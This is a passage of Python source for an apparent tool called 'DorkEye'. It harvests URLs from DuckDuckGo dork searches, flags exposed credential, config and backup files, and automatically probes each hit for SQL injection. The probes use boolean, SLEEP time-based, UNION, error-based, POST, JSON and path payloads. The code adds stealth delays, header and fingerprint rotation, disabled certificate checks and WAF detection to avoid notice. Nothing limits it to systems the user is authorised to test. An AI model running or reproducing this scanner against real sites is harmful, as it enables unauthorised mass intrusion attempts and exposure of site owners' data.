            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        bool_payloads = [
            ("1' AND '1'='1", "true"),
            ("1' AND '1'='2", "false"),
            ("1 AND 1=1",     "true"),
            ("1 AND 1=2",     "false"),
        ]

        true_groups:  List[List[int]] = []
        false_groups: List[List[int]] = []

        for payload, payload_type in bool_payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            samples: List[int] = []

            for _ in range(_BOOL_SAMPLES):
                if _exit_requested or _skip_current:
                    break
                r = self._get(test_url)
                if r is not None:
                    samples.append(len(r.text))
                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1))

            if len(samples) >= 2:
                (true_groups if payload_type == "true" else false_groups).append(samples)

            if self.stealth:
                _interruptible_sleep(random.uniform(1, 2))

        if not true_groups or not false_groups:
            return result

        all_true  = [v for g in true_groups  for v in g]
        all_false = [v for g in false_groups for v in g]

        median_true  = statistics.median(all_true)
        median_false = statistics.median(all_false)
        diff         = abs(median_true - median_false)

        internal_variance_true  = max(all_true)  - min(all_true)
        internal_variance_false = max(all_false) - min(all_false)
        noise_ceiling           = baseline_len * 0.04

        if (diff > baseline_len * 0.15
                and internal_variance_true  < noise_ceiling
                and internal_variance_false < noise_ceiling):
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.MEDIUM.value
            result["evidence"].append(
                f"Boolean median differential: TRUE={median_true:.0f}B  "
                f"FALSE={median_false:.0f}B  diff={diff:.0f}B  "
                f"variance_t={internal_variance_true:.0f}B  "
                f"variance_f={internal_variance_false:.0f}B"
            )

        return result

    def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
        result = {
            "method":     "time_based_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        baseline = self._measure_baseline_latency(url)
        if baseline is None:
            result["evidence"].append(
                "Skipped: host unreachable or baseline latency too high"
            )
            return result

        threshold  = baseline + _SLEEP_DELAY + _TIMEBASED_MARGIN
        extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

        sleep_payloads = [
            f"1' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
            f"1 AND SLEEP({_SLEEP_DELAY})",
        ]
        neutral_payload = "1' AND '1'='1"

        for sleep_payload in sleep_payloads:
            if self.circuit_breaker.is_dead(url):
                break

            test_url = self._inject_payload(url, param_name, sleep_payload)
            t0       = time.monotonic()
            response = self._get(test_url, extra_read=extra_read)
            elapsed  = time.monotonic() - t0

            sleep_triggered = False
            if response is None and elapsed >= threshold * 0.9:
                sleep_triggered = True
            elif response is not None and elapsed >= threshold:
                sleep_triggered = True

            if not sleep_triggered:
                continue

            # [4] WAF check on the sleep response
            if response is not None:
                waf = self._detect_waf(response)
                if waf:
                    result["evidence"].append(
                        f"WAF detected ({waf}): time-based latency may be firewall delay"
                    )
                    continue

            neutral_url      = self._inject_payload(url, param_name, neutral_payload)
            confirm_times:   List[float] = []
            confirm_failures = 0

            for _ in range(_TIMEBASED_CONFIRM):
                if self.circuit_breaker.is_dead(url):
                    break
                if _exit_requested or _skip_current:
                    break
                t_c       = time.monotonic()
                r_c       = self._get(neutral_url)
                elapsed_c = time.monotonic() - t_c

                if r_c is None:
                    confirm_failures += 1
                else:
                    confirm_times.append(elapsed_c)

                _interruptible_sleep(0.5)

            if confirm_failures > 0:
                continue
            if not confirm_times:
                continue

            confirm_avg       = sum(confirm_times) / len(confirm_times)
            confirm_threshold = baseline + _TIMEBASED_MARGIN

            if confirm_avg <= confirm_threshold:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.MEDIUM.value
                result["evidence"].append(
                    f"Time-based confirmed: SLEEP elapsed={elapsed:.1f}s  "
                    f"threshold={threshold:.1f}s  "
                    f"neutral avg={confirm_avg:.2f}s  "
                    f"baseline={baseline:.2f}s"
                )
                return result

        return result

    # ──────────────────────────────────────────────────────────
    #  test_sqli — orchestrator
    #  [3] Complete confidence logic: LOW / MEDIUM / HIGH / CRITICAL
    #  [5] UNION-based probe added to per-param loop
    #  [6] Parameters tested in priority order
    #  [4] WAF recorded in top-level result
    # ──────────────────────────────────────────────────────────

    def test_sqli(self, url: str) -> Dict:
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,   # [4]
        }

        if not self.has_query_params(url):
            result["message"] = "No query parameters found"
            return result

        if self.circuit_breaker.is_dead(url):
            result["message"] = "Host unreachable (circuit breaker open)"
            return result

        result["tested"] = True
        params = self._extract_query_params(url)
        if not params:
            result["message"] = "No query parameters found"
            return result

        baseline = self._get_baseline_response(url)
        if baseline is None:
            result["message"] = "Could not establish baseline (host unreachable)"
            return result

        baseline_status, baseline_content, baseline_len = baseline

        # [4] Detect WAF on clean baseline response
        baseline_resp_obj = self._get(url)
        if baseline_resp_obj is not None:
            waf_on_baseline = self._detect_waf(baseline_resp_obj)
            if waf_on_baseline:
                result["waf_detected"] = waf_on_baseline
                result["message"] = (
                    f"WAF detected ({waf_on_baseline}) on baseline — "
                    f"results may have false negatives"
                )

        # [3] Per-param score accumulator
        # Score scale per technique:
        #   error_based HIGH → 3  |  error_based other → 2
        #   union HIGH       → 3  |  union MEDIUM       → 2  |  union LOW → 1
        #   bool_blind       → 2
        #   time_based HIGH  → 3  |  time_based other   → 2
        # Per-param total ≥ 5 → CRITICAL (two independent strong signals)
        per_param_scores: List[int] = []

        # [6] Test params in priority order
        for param_name in self._prioritize_params(params):

            if self.circuit_breaker.is_dead(url):
                result["message"] = "Host became unreachable during testing"
                break
            if _exit_requested or _skip_current:
                break
            if not self._probe_parameter(url, param_name, baseline_content):
                continue

            param_score = 0

            # ── Error-based ───────────────────────────────────
            error_result = self._test_error_based(url, param_name)
            result["tests"].append(error_result)

            # Propagate WAF discovery [4]
            if error_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = error_result["waf"]

            if error_result["vulnerable"]:
                if error_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                    # Early return: HIGH error-based is definitive
                    result["vulnerable"]         = True
                    result["overall_confidence"] = SQLiConfidence.HIGH.value
                    result["message"]            = f"Tested {len(params)} parameter(s)"
                    return result
                else:
                    param_score += 2

            # ── UNION-based [5] ───────────────────────────────
            union_result = self._test_union_based(url, param_name, baseline_len)
            result["tests"].append(union_result)

            if union_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = union_result["waf"]

            if union_result["vulnerable"]:
                if union_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                elif union_result["confidence"] == SQLiConfidence.MEDIUM.value:
                    param_score += 2
                else:  # LOW
                    param_score += 1

            # ── Boolean blind ─────────────────────────────────
            bool_result = self._test_boolean_blind(url, param_name, baseline_len)
            result["tests"].append(bool_result)
            if bool_result["vulnerable"]:
                param_score += 2

            # ── Time-based blind ──────────────────────────────
            time_result = self._test_time_based_blind(url, param_name)
            result["tests"].append(time_result)
            if time_result.get("vulnerable", False):
                param_score += (
                    3 if time_result["confidence"] == SQLiConfidence.HIGH.value else 2
                )

            if param_score > 0:
                per_param_scores.append(param_score)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        # ── [3] Aggregate confidence across all parameters ────
        if per_param_scores:
            best  = max(per_param_scores)
            avg   = sum(per_param_scores) / len(per_param_scores)

            result["vulnerable"] = True

            # CRITICAL: at least one param has two strong independent signals
            if best >= 5:
                result["overall_confidence"] = SQLiConfidence.CRITICAL.value
            # HIGH: single strong technique or consistent multi-param evidence
            elif best >= 3 or avg >= 3:
                result["overall_confidence"] = SQLiConfidence.HIGH.value
            # MEDIUM: moderate evidence on at least one param
            elif best >= 2 or avg >= 2:
                result["overall_confidence"] = SQLiConfidence.MEDIUM.value
            # LOW: weak signal (e.g. only UNION col-mismatch hinting)
            else:
                result["overall_confidence"] = SQLiConfidence.LOW.value

        result["message"] = f"Tested {len(params)} parameter(s)"
        return result

    def test_post_sqli(self, url: str, post_data: Dict[str, str]) -> Dict:
        result = {
            "url": url, "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [], "tested": False, "message": "",
            "waf_detected": None,
        }
        if not post_data or self.circuit_breaker.is_dead(url):
            result["message"] = "No POST parameters or host unreachable"
            return result

        result["tested"]  = True
        baseline_resp     = self._get(url)
        if baseline_resp is None:
            result["message"] = "Could not establish baseline"
            return result

        # [4] WAF check on baseline
        waf = self._detect_waf(baseline_resp)
        if waf:
            result["waf_detected"] = waf

        confidence_scores = []

        for param_name in post_data.keys():
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            payload_dict             = post_data.copy()
            payload_dict[param_name] = str(post_data[param_name]) + "'"

            self.fingerprint_rotator.get_random()
            _hdrs    = self.fingerprint_rotator.build_headers()
            _data    = payload_dict
            _timeout = self._timeout()

            def _do_post():
                return self._session.post(
                    url,
                    data    = _data,
                    headers = _hdrs,
                    timeout = _timeout,
                    verify  = False,
                )

            response = self._run_interruptible(
                _do_post,
                total_timeout    = _CONNECT_TIMEOUT + self.read_timeout,
                on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
            )
            if response is None:
                if self.circuit_breaker.is_dead(url):
                    break
                continue

            # [4] Skip WAF-blocked responses
            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "post_error_based",
                    "parameter": param_name,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            avg = sum(confidence_scores) / len(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value if avg >= 3 else SQLiConfidence.MEDIUM.value
            )
            result["vulnerable"] = True

        result["message"] = f"Tested {len(post_data)} POST parameter(s)"
        return result

    def test_json_sqli(self, url: str, json_data: Dict[str, str]) -> Dict:
        result = {
            "url": url, "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [], "tested": False, "message": "",
            "waf_detected": None,
        }
        if not json_data or self.circuit_breaker.is_dead(url):
            result["message"] = "No JSON parameters or host unreachable"
            return result

        result["tested"]  = True
        confidence_scores = []

        for key in json_data.keys():
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            payload_dict      = json_data.copy()
            payload_dict[key] = payload_dict[key] + "'"

            _json    = payload_dict
            _timeout = self._timeout()

            def _do_json_post():
                return self._session.post(
                    url,
                    json    = _json,
                    timeout = _timeout,
                    verify  = False,
                )

            response = self._run_interruptible(
                _do_json_post,
                total_timeout    = _CONNECT_TIMEOUT + self.read_timeout,
                on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
            )
            if response is None:
                continue

            # [4] WAF check
            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "json_error_based",
                    "parameter": key,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            avg = sum(confidence_scores) / len(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value if avg >= 3 else SQLiConfidence.MEDIUM.value
            )
            result["vulnerable"] = True

        result["message"] = "JSON injection test completed"
        return result

    def test_path_based_sqli(self, url: str) -> Dict:
        result = {
            "method":     "path_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }
        if self.circuit_breaker.is_dead(url):
            return result

        path = urlparse(url).path
        if re.search(r"/\d+$", path) or re.search(r"/\w+$", path):
            response = self._get(url + "'")
            if response:
                # [4] WAF check
                waf = self._detect_waf(response)
                if waf:
                    result["evidence"].append(f"WAF detected ({waf}): path-based skipped")
                    return result

                match = self._match_sql_errors(response.text)
                if match:
                    db_type, pattern = match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"Path-based SQLi: {db_type.upper()} — {pattern[:60]}"
                    )
        return result


# ══════════════════════════════════════════════════════════════
#  UserAgentRotator
# ══════════════════════════════════════════════════════════════

class UserAgentRotator:
    def __init__(self):
        self.agents        = [a for lst in USER_AGENTS.values() for a in lst]
        self.current_index = 0

    def get_random(self) -> str:
        return random.choice(self.agents)

    def get_next(self) -> str:
        agent              = self.agents[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.agents)
        return agent


# ══════════════════════════════════════════════════════════════
#  FileAnalyzer
# ══════════════════════════════════════════════════════════════

class FileAnalyzer:
    def __init__(self, config: Dict, ua_rotator: UserAgentRotator, fp_rotator: HTTPFingerprintRotator):
        self.config        = config
        self.ua_rotator    = ua_rotator
        self.fp_rotator    = fp_rotator
        self.extension_map = self._flatten_extensions()
        self.sqli_detector = SQLiDetector(
            stealth = config.get("stealth_mode", False),
            timeout = config.get("request_timeout", 10)
        )
        self.session = self._create_session()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry   = Retry(
            total            = self.config.get("max_retries", 3),
            backoff_factor   = 1,
            status_forcelist = [429, 500, 502, 503, 504],
            allowed_methods  = ["GET", "HEAD"]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://",  adapter)
        session.mount("https://", adapter)
        return session

    def _flatten_extensions(self) -> Dict[str, str]:
        ext_map = {}
        for category, extensions in self.config["extensions"].items():
            for ext in extensions:
                ext_map[ext.lower()] = category
        return ext_map

    def get_file_extension(self, url: str) -> str:
        try:
            path = unquote(urlparse(url).path)
            ext  = os.path.splitext(path)[1].lower()
            return ext if ext else ""
        except Exception:
            return ""

    def categorize_url(self, url: str) -> str:
        ext = self.get_file_extension(url)
        if not ext:
            return "webpage"
        return self.extension_map.get(ext, "other")

    def is_blacklisted(self, url: str) -> bool:
        if not self.config["blacklist"]:
            return False
        return self.get_file_extension(url) in self.config["blacklist"]

    def is_whitelisted(self, url: str) -> bool:
        if not self.config["whitelist"]:
            return True
        return self.get_file_extension(url) in self.config["whitelist"]

    def analyze_file(self, url: str) -> Dict:
        result = {
            "url":          url,
            "extension":    self.get_file_extension(url),
            "category":     self.categorize_url(url),
            "size":         None,
            "content_type": None,
            "accessible":   False,
            "status_code":  None,
        }
        try:
            if self.config.get("http_fingerprinting", True):
                self.fp_rotator.get_random()
                headers = self.fp_rotator.build_headers()
            elif self.config.get("user_agent_rotation", True):
                headers = {"User-Agent": self.ua_rotator.get_random()}
            else:
                headers = {"User-Agent": self.ua_rotator.agents[0]}

            response              = self.session.head(
                url,
                timeout         = (4, self.config.get("request_timeout", 10)),
                allow_redirects = True,
                headers         = headers,
                verify          = False,
            )
            result["status_code"] = response.status_code
            result["accessible"]  = response.status_code == 200

            if "content-length" in response.headers:
                try:
                    result["size"] = int(response.headers["content-length"])
                except Exception:
                    pass
            if "content-type" in response.headers:
                result["content_type"] = response.headers["content-type"]

        except Exception as e:
            result["error"] = str(e)
        return result

    def check_sqli(self, url: str) -> Dict:
        if not self.config.get("sqli_detection", False):
            return {"tested": False}
        return self.sqli_detector.test_sqli(url)


# ══════════════════════════════════════════════════════════════
#  DorkEyeEnhanced
# ══════════════════════════════════════════════════════════════

class DorkEyeEnhanced:
    def __init__(self, config: Dict, output_file: str = None):
        self.config      = config
        self.output_file = output_file
        self.ua_rotator  = UserAgentRotator()
        self.fp_rotator  = HTTPFingerprintRotator()
        self.analyzer    = FileAnalyzer(config, self.ua_rotator, self.fp_rotator)
        self.results:    List[Dict] = []
        self.stats       = defaultdict(int)
        self.url_hashes: Set[str]  = set()
        self.start_time  = time.time()
        self._total_results_at_last_extended_delay: int = 0

    def _hash_url(self, url: str) -> str:
        return hashlib.md5(url.encode(), usedforsecurity=False).hexdigest()

    def is_duplicate(self, url: str) -> bool:
        h = self._hash_url(url)
        if h in self.url_hashes:
            return True
        self.url_hashes.add(h)
        return False

    def process_dorks(self, dork_input: str) -> List[str]:
        if os.path.isfile(dork_input):
            with open(dork_input, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return [dork_input]

    def _compute_base_delay(self, results_found: int, stealth: bool) -> float:
        if results_found < 10:
            low, high = 8, 14
        else:
            low, high = 18, 28
        delay = random.uniform(low, high)
        if stealth:
            delay *= random.uniform(1.4, 1.8)
        return round(delay, 2)

    def _should_trigger_extended_delay(self) -> bool:
        threshold = self.config.get("extended_delay_every_n_results", 100)
        collected_since_last = len(self.results) - self._total_results_at_last_extended_delay
        return collected_since_last >= threshold

    # ──────────────────────────────────────────────────────────
    #  search_dork
    #  [1] Timestamp: human-readable "%Y-%m-%d %H:%M:%S"
    # ──────────────────────────────────────────────────────────

    def search_dork(self, dork: str, count: int,
                    dork_index: int = 1, total_dorks: int = 1) -> List[Dict]:
        global _skip_current, _exit_requested

        _ts = datetime.now().strftime("%H:%M:%S")
        console.print(
            f"\n[bold cyan][ Dork {dork_index}/{total_dorks} ][/bold cyan]"
            f"  [dim]{_ts}[/dim]"
            f"  [dim]Ctrl+C → skip  │  ×2 → quit[/dim]"
        )
        console.print(f"[bold green][*] Searching dork:[/bold green] {dork}")

        _skip_current = False

        results       = []
        total_fetched = 0
        max_attempts  = 3

        _DONE = object()

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Searching DuckDuckGo...", total=count)

            for attempt in range(max_attempts):
                if _exit_requested or _skip_current:
                    break
                try:
                    batch_size = min(50, count - total_fetched)
                    if batch_size <= 0:
                        break

                    result_queue: queue.Queue = queue.Queue()
                    stop_event = threading.Event()

                    def _producer(dork=dork, batch_size=batch_size,
                                  q=result_queue, stop=stop_event):
                        try:
                            for item in DDGS().text(dork, max_results=batch_size):
                                if stop.is_set():
                                    break
                                q.put(item)
                        except Exception:
                            pass
                        finally:
                            q.put(_DONE)

                    threading.Thread(target=_producer, daemon=True).start()

                    while True:
                        if _exit_requested or _skip_current:
                            stop_event.set()
                            break
                        try:
                            r = result_queue.get(timeout=0.25)
                        except queue.Empty:
                            continue

                        if r is _DONE:
                            break

                        url = r.get("href") or r.get("url")
                        if not url:
                            continue
                        if self.analyzer.is_blacklisted(url):
                            self.stats["blacklisted"] += 1
                            continue
                        if not self.analyzer.is_whitelisted(url):
                            self.stats["not_whitelisted"] += 1
                            continue
                        if self.is_duplicate(url):
                            self.stats["duplicates"] += 1
                            continue

                        entry = {
                            "url":       url,
                            "title":     r.get("title", ""),
                            "snippet":   r.get("body", ""),
                            "dork":      dork,
                            # [1] Human-readable timestamp
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "extension": self.analyzer.get_file_extension(url),
                            "category":  self.analyzer.categorize_url(url)
                        }
                        results.append(entry)
                        total_fetched += 1
                        self.stats["total_found"] += 1
                        self.stats[f"category_{entry['category']}"] += 1
                        progress.update(task, completed=min(total_fetched, count))
                        if total_fetched >= count:
                            stop_event.set()
                            break

                    if total_fetched >= count:
                        break

                    if attempt < max_attempts - 1 and total_fetched < count:
                        if _exit_requested or _skip_current:
                            break
                        backoff = (2 ** attempt) + random.uniform(0, 3)
                        console.print(
                            f"[yellow][~] Retry {attempt + 1}/{max_attempts - 1} — "
                            f"backing off {backoff:.1f}s[/yellow]"
                        )
                        _interruptible_sleep(backoff)

                except Exception as e:
                    console.print(f"[yellow][!] Attempt {attempt + 1} failed: {str(e)}[/yellow]")
                    if attempt < max_attempts - 1 and not _exit_requested and not _skip_current:
                        backoff = (2 ** attempt) + random.uniform(0, 3)
                        console.print(
                            f"[yellow][~] Waiting {backoff:.1f}s before next attempt...[/yellow]"
                        )
                        _interruptible_sleep(backoff)
                    continue

        if _skip_current:
            console.print(f"[yellow][~] Dork {dork_index}/{total_dorks} skipped.[/yellow]")
            _skip_current = False

        console.print(f"[bold blue][+] Found {len(results)} unique results for this dork[/bold blue]")
        return results

    def analyze_results(self, results: List[Dict]) -> List[Dict]:
        global _skip_current, _exit_requested

        if not self.config.get("analyze_files", False) and not self.config.get("sqli_detection", False):
            return results
        console.print("\n[bold yellow][*] Analyzing results...[/bold yellow]")
        files_to_analyze  = [r for r in results if r["category"] != "webpage"]
        urls_to_test_sqli = [r for r in results if self.config.get("sqli_detection", False)]

        with Progress(console=console) as progress:
            if self.config.get("analyze_files", False) and files_to_analyze:
                task1 = progress.add_task("[cyan]Analyzing [yellow]files[cyan]...", total=len(files_to_analyze))
                for result in files_to_analyze:
                    if _exit_requested or _skip_current:
                        break
                    analysis = self.analyzer.analyze_file(result["url"])
                    result.update({
                        "file_size":    analysis["size"],
                        "content_type": analysis["content_type"],
                        "accessible":   analysis["accessible"],
                        "status_code":  analysis["status_code"],
                    })
                    progress.advance(task1)
                    _interruptible_sleep(random.uniform(1, 2) if self.config.get("stealth_mode", False) else 0.5)

                if _skip_current and not _exit_requested:
                    console.print("[yellow][~] Ctrl+C — file analysis skipped.[/yellow]")
                    _skip_current = False

            if self.config.get("sqli_detection", False) and urls_to_test_sqli:
                task2 = progress.add_task("[cyan]Testing for [red]SQLi[cyan]...", total=len(urls_to_test_sqli))
                for result in urls_to_test_sqli:
                    if _exit_requested:
                        break
                    if _skip_current:
                        console.print("[yellow][~] Ctrl+C — skipping remaining SQLi tests for this dork.[/yellow]")
                        _skip_current = False
                        break

                    sqli_result         = self.analyzer.check_sqli(result["url"])
                    result["sqli_test"] = sqli_result

                    # [4] Surface WAF info in console
                    if sqli_result.get("waf_detected"):
                        console.print(
                            f"[yellow][~] WAF detected "
                            f"({sqli_result['waf_detected']}): {result['url']}[/yellow]"
                        )
                        self.stats["waf_detected"] += 1

                    if sqli_result.get("vulnerable", False):
                        self.stats["sqli_vulnerable"] += 1
                        confidence = sqli_result.get("overall_confidence", "?")
                        # [3] CRITICAL gets a distinct visual cue
                        style = (
                            "[bold magenta]" if confidence == SQLiConfidence.CRITICAL.value
                            else "[bold red]"
                        )
                        console.print(
                            f"{style}[!] Potential SQLi found "
                            f"({confidence}): {result['url']}[/{style[1:]}"
                        )
                    progress.advance(task2)
                    if self.config.get("stealth_mode", False):
                        _interruptible_sleep(random.uniform(3, 6))
        return results

    def run_search(self, dorks: List[str], count: int):
        global _skip_current, _exit_requested

        total_dorks = len(dorks)
        console.print(f"[bold cyan][*] Search with {total_dorks} dork(s)[/bold cyan]\n")
        console.print(
            f"[dim]💡 Ctrl+C during a dork → skip it.  "
            f"Double Ctrl+C → quit.[/dim]\n"
        )
        if self.config.get("stealth_mode", False):
            console.print("[bold magenta][*] Stealth mode: ACTIVE[/bold magenta]")
        if self.config.get("http_fingerprinting", True):
            console.print("[bold magenta][*] HTTP Fingerprinting: ENABLED[/bold magenta]")
        if self.config.get("sqli_detection", False):
            console.print("[bold red][*] SQL Injection Detection: ENABLED[/bold red]")
        # [7] Android badge in run header
        if TERMUX_IS_ANDROID:
            console.print("[bold green][*] Android/Termux mode: battery-saver constants active[/bold green]")

        for index, dork in enumerate(dorks, start=1):
            if _exit_requested:
                console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                break

            results = self.search_dork(dork, count,
                                       dork_index=index, total_dorks=total_dorks)

            if _exit_requested:
                self.results.extend(results)
                if self.output_file:
                    self.save_results()
                console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                break

            if self.config.get("analyze_files", False) or self.config.get("sqli_detection", False):
                results = self.analyze_results(results)

            self.results.extend(results)
            if self.output_file:
                self.save_results()

            if _exit_requested:
                console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                break

            if index >= total_dorks:
                break

            stealth = self.config.get("stealth_mode", False)
            delay   = self._compute_base_delay(len(results), stealth)
            console.print(f"[yellow][~] Waiting {delay}s before next dork...[/yellow]")

            elapsed = 0.0
            while elapsed < delay:
                if _exit_requested or _skip_current:
                    break
                time.sleep(0.5)
                elapsed += 0.5

            if _exit_requested:
                console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                break
            if _skip_current:
                console.print("[yellow][~] Delay skipped.[/yellow]")
                _skip_current = False

            if self._should_trigger_extended_delay():
                long_delay = round(
                    random.uniform(120, 150) if stealth
                    else random.uniform(85, 110), 2
                )
                console.print(
                    f"[bold magenta][~] Extended delay: {long_delay}s "
                    f"({len(self.results)} total results collected — rate limit protection)"
                    f"[/bold magenta]"
                )
                elapsed = 0.0
                while elapsed < long_delay:
                    if _exit_requested or _skip_current:
                        break
                    time.sleep(0.5)
                    elapsed += 0.5

                if _exit_requested:
                    console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                    break
                if _skip_current:
                    console.print("[yellow][~] Extended delay skipped.[/yellow]")
                    _skip_current = False

                self._total_results_at_last_extended_delay = len(self.results)

    def save_results(self):
        if not self.output_file:
            return
        downloads_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Dump")
        os.makedirs(downloads_folder, exist_ok=True)
        filename = os.path.join(downloads_folder, self.output_file)
        ext      = os.path.splitext(filename)[1].lower()
        if not ext:
            filename += ".json"
            ext       = ".json"
        if   ext == ".csv":  self._save_csv(filename)
        elif ext == ".json": self._save_json(filename)
        elif ext == ".html": self._save_html(filename)
        elif ext == ".txt":  self._save_txt(filename)
        else:
            console.print(f"[red][!] Unsupported output format: {ext}[/red]")

    def _save_csv(self, filename: str):
        if not self.results:
            return
        fieldnames = [
            "url","title","snippet","dork","timestamp","extension","category",
            "file_size","content_type","accessible","status_code",
            "sqli_vulnerable","sqli_confidence","waf_detected"
        ]
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
            writer.writeheader()
            for result in self.results:
                row = result.copy()
                if "sqli_test" in result:
                    row["sqli_vulnerable"] = result["sqli_test"].get("vulnerable", False)
                    row["sqli_confidence"] = result["sqli_test"].get("overall_confidence", "none")
                    row["waf_detected"]    = result["sqli_test"].get("waf_detected", "")
                writer.writerow(row)

    def _save_json(self, filename: str):
        data = {
            "metadata": {
                "total_results":               len(self.results),
                "generated_at":                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "sqli_detection_enabled":      self.config.get("sqli_detection", False),
                "sqli_vulnerabilities_found":  self.stats.get("sqli_vulnerable", 0),
                "waf_blocked_count":           self.stats.get("waf_detected", 0),
                "http_fingerprinting_enabled": self.config.get("http_fingerprinting", True),
                "stealth_mode":                self.config.get("stealth_mode", False),
                "android_mode":                TERMUX_IS_ANDROID,
                "statistics":                  dict(self.stats)
            },
            "results": self.results
        }
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

    def _save_txt(self, filename: str):
        if not self.results:
            return
        with open(filename, "w", encoding="utf-8") as f:
            for idx, result in enumerate(self.results, 1):
                f.write(f"{idx}. {result.get('url')}\n")
                if result.get("title"):
                    f.write(f"   Title: {result.get('title')}\n")
                if result.get("category"):
                    f.write(f"   Category: {result.get('category')}\n")
                if "sqli_test" in result:
                    sqli = result["sqli_test"]
                    if sqli.get("tested", False):
                        status = "VULNERABLE" if sqli.get("vulnerable") else "SAFE"
                        f.write(f"   SQLi: {status} ({sqli.get('overall_confidence')})\n")
                    if sqli.get("waf_detected"):
                        f.write(f"   WAF: {sqli.get('waf_detected')}\n")
                f.write("\n")

    def _save_html(self, filename: str):
        sqli_count = self.stats.get("sqli_vulnerable", 0)
        sqli_safe  = sum(
            1 for r in self.results
            if "sqli_test" in r and r["sqli_test"].get("tested") and not r["sqli_test"].get("vulnerable")
        )
        sqli_total = sqli_count + sqli_safe
        waf_count  = self.stats.get("waf_detected", 0)
        cnt        = {"all": len(self.results), "doc": 0, "sqli": sqli_total, "scripts": 0, "page": 0}
        for r in self.results:
            cat = r.get("category", "unknown")
            if cat in ("documents", "archives", "backups"):    cnt["doc"]     += 1
            elif cat in ("scripts", "configs", "credentials"): cnt["scripts"] += 1
            elif cat == "webpage":                             cnt["page"]    += 1

        # ── Build JS-embeddable export data ───────────────────────────────
        export_rows = []
        for r in self.results:
            sqli_t = r.get("sqli_test", {})
            if sqli_t.get("tested"):
                conf = sqli_t.get("overall_confidence", "")
                if sqli_t.get("vulnerable"):
                    sqli_s = "critical" if conf == "critical" else "vuln"
                else:
                    sqli_s = "safe"
            else:
                sqli_s = "untested"
            export_rows.append({
                "url":       r.get("url", ""),
                "title":     r.get("title", ""),
                "dork":      r.get("dork", ""),
                "category":  r.get("category", ""),
                "ext":       r.get("extension", ""),
                "timestamp": r.get("timestamp", ""),
                "sqli":      sqli_s,
                "conf":      sqli_t.get("overall_confidence", ""),
                "waf":       sqli_t.get("waf_detected", "") or "",
            })
        import json as _json
        export_data_js = _json.dumps(export_rows, ensure_ascii=False).replace("</", "<\\/")
        report_base    = os.path.splitext(os.path.basename(filename))[0]

        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DorkEye | Report</title>
    <style>
        *, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: 'Courier New', monospace; background: #000; color: #00ff41; min-height: 100vh; overflow-x: hidden; }}
        #matrix-canvas {{ position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.32; pointer-events: none; }}
        #content {{ position: relative; z-index: 1; padding: 28px 32px; max-width: 1400px; margin: 0 auto; }}
        /* ── Header ── */
